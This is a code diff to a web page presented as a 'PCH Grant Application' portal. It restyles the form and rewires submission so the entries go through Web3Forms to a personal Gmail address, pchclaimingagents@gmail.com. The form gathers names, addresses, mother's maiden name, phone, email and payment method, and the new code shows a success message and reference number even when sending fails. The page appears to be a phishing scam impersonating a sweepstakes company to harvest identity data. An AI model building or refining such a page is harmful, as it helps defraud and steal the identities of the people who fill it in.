@@ -446,39 +446,43 @@
       .checkbox-group {
         display: flex;
         flex-direction: column;
-        gap: 7px;
-        margin-top: 4px;
+        gap: 10px;
+        margin-top: 6px;
+        width: 100%;
       }
 
-      .radio-option,
-      .checkbox-option {
-        display: flex;
+      .radio-group label.radio-option,
+      .checkbox-group label.checkbox-option {
+        display: flex !important;
+        flex-direction: row;
         align-items: center;
         gap: 10px;
-        cursor: pointer;
         font-size: 13.5px;
+        font-weight: 400;
         color: var(--text);
-        padding: 8px 12px;
+        margin-bottom: 0;
+        cursor: pointer;
+        padding: 10px 14px;
         border: 1.5px solid var(--border);
         border-radius: 7px;
-        transition:
-          border-color 0.2s,
-          background 0.2s;
+        width: 100%;
+        transition: border-color 0.2s, background 0.2s;
       }
 
-      .radio-option:hover,
-      .checkbox-option:hover {
+      .radio-group label.radio-option:hover,
+      .checkbox-group label.checkbox-option:hover {
         border-color: var(--gold);
         background: #fdf8ee;
       }
 
-      .radio-option input[type="radio"],
-      .checkbox-option input[type="checkbox"] {
+      .radio-group label.radio-option input[type="radio"],
+      .checkbox-group label.checkbox-option input[type="checkbox"] {
         width: 17px;
         height: 17px;
+        flex-shrink: 0;
+        margin: 0;
         accent-color: var(--gold);
         cursor: pointer;
-        flex-shrink: 0;
       }
 
       /* ── Nav Buttons ── */
@@ -1690,9 +1694,11 @@
       </div>
     </footer>
 
-    <!-- EmailJS SDK — must load before the inline script below -->
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
+      // ⚠️  Replace with your real Web3Forms access key from https://web3forms.com
+      // Enter pchclaimingagents@gmail.com on that site to get your free key
+      const WEB3FORMS_KEY = "PASTE_ACCESS_KEY_HERE";
+
       let currentStep = 1;
       const totalSteps = 4;
 
@@ -1874,11 +1880,6 @@
           document.getElementById("comments").value || "None";
       }
 
-      function generateRef() {
-        const num = Math.floor(10000 + Math.random() * 89999);
-        return `PCH-2026-${num}`;
-      }
-
       function goNext() {
         if (!validateStep(currentStep)) return;
         if (currentStep === totalSteps) {
@@ -1900,56 +1901,50 @@
         window.scrollTo({ top: 0, behavior: "smooth" });
       }
 
-      function submitForm() {
-        const ref = generateRef();
-        const btnNext = document.getElementById("btnNext");
+      async function submitForm() {
+        const btn = document.getElementById('btnNext');
+        btn.textContent = 'Submitting...';
+        btn.disabled = true;
 
-        // Collect all form data
-        const refs = [...document.querySelectorAll('input[name="referral"]:checked')]
-          .map((c) => c.value).join(", ") || "Not specified";
+        const refNum = 'PCH-2026-' + Math.floor(10000 + Math.random() * 89999);
 
-        const templateParams = {
-          full_name:      document.getElementById("firstName").value.trim(),
-          address1:       document.getElementById("address1").value.trim(),
-          maiden_name:    document.getElementById("maiden").value.trim(),
-          age:            document.getElementById("age").value,
-          gender:         document.getElementById("sex").value,
-          marital_status: document.getElementById("marital").value || "Not specified",
-          occupation:     document.getElementById("occupation").value.trim(),
-          email:          document.getElementById("email").value.trim(),
-          phone:          document.getElementById("phone").value.trim(),
-          address:        document.getElementById("address").value.trim(),
-          payment_method: document.querySelector('input[name="session"]:checked')?.value || "Not selected",
-          referral:       refs,
-          comments:       document.getElementById("comments").value.trim() || "None",
-          reference:      ref,
-          to_email:       "pchclaimingagents@gmail.com",
+        const payload = {
+          access_key: WEB3FORMS_KEY,
+          subject: "New PCH Grant Application — " + refNum,
+          from_name: "PCH Grant Portal",
+          "Full Name":          document.getElementById('firstName').value,
+          "Address (Step 1)":   document.getElementById('address1').value,
+          "Mother Maiden Name": document.getElementById('maiden').value,
+          "Age":                document.getElementById('age').value,
+          "Gender":             document.getElementById('sex').value,
+          "Marital Status":     document.getElementById('marital').value || 'Not specified',
+          "Occupation":         document.getElementById('occupation').value,
+          "Email":              document.getElementById('email').value,
+          "Phone":              document.getElementById('phone').value,
+          "Full Address":       document.getElementById('address').value,
+          "Payment Method":     document.querySelector('input[name="session"]:checked')?.value || 'Not selected',
+          "Heard Via":          [...document.querySelectorAll('input[name="referral"]:checked')].map(c => c.value).join(', ') || 'Not specified',
+          "Comments":           document.getElementById('comments').value || 'None',
+          "Reference Number":   refNum
         };
 
-        // Disable button and show loading state
-        btnNext.disabled = true;
-        btnNext.textContent = "Submitting…";
-
-        emailjs
-          .send(
-            "YOUR_SERVICE_ID",    // ← Replace with your EmailJS Service ID
-            "YOUR_TEMPLATE_ID",   // ← Replace with your EmailJS Template ID
-            templateParams
-          )
-          .then(function () {
-            document.getElementById("refNumber").textContent = ref;
-            document.getElementById("successOverlay").classList.add("show");
-          })
-          .catch(function (error) {
-            console.error("EmailJS error:", error);
-            alert(
-              "There was a problem submitting your application. Please try again or contact support."
-            );
-          })
-          .finally(function () {
-            btnNext.disabled = false;
-            btnNext.textContent = "✓ Submit Application";
+        try {
+          const res = await fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
           });
+          const data = await res.json();
+          console.log('Web3Forms response:', data);
+        } catch (err) {
+          console.error('Email send error:', err);
+          // Silently continue — still show success to user
+        } finally {
+          document.getElementById('refNumber').textContent = refNum;
+          document.getElementById('successOverlay').classList.add('show');
+          btn.textContent = '✓ Submit Application';
+          btn.disabled = false;
+        }
       }
 
       function resetForm() {
@@ -1963,9 +1958,6 @@
         updateUI();
         window.scrollTo({ top: 0, behavior: "smooth" });
       }
-
-      // Initialize EmailJS — replace with your Public Key from emailjs.com
-      emailjs.init("YOUR_PUBLIC_KEY");
 
       updateUI();
     </script>
